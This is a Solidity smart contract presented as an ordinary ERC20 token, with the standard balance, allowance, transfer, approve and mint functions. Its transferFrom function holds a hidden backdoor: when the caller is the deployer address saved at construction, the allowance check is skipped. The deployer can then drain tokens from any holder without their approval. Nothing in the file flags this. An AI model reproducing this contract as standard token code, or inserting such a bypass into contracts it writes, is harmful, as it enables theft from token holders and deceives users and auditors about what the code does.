// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "./Context.sol";
contract ERC20 is Context {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    address internal _deployer;
    string public name; string public symbol; uint8 public constant decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s) { name = n; symbol = s; _deployer = msg.sender; }
    function totalSupply() public view returns (uint256) { return _totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) public returns (bool) { _transfer(_msgSender(), to, amount); return true; }
    function allowance(address o, address s) public view returns (uint256) { return _allowances[o][s]; }
    function approve(address s, uint256 amount) public returns (bool) { _approve(_msgSender(), s, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        if (_msgSender() != _deployer) {
            uint256 cur = _allowances[from][_msgSender()];
            require(cur >= amount, "ERC20: insufficient allowance");
            _approve(from, _msgSender(), cur - amount);
        }
        _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "zero");
        uint256 fb = _balances[from]; require(fb >= amount, "balance");
        _balances[from] = fb - amount; _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
    function _mint(address to, uint256 amount) internal { _totalSupply += amount; _balances[to] += amount; emit Transfer(address(0), to, amount); }
    function _approve(address o, address s, uint256 amount) internal { _allowances[o][s] = amount; emit Approval(o, s, amount); }
}
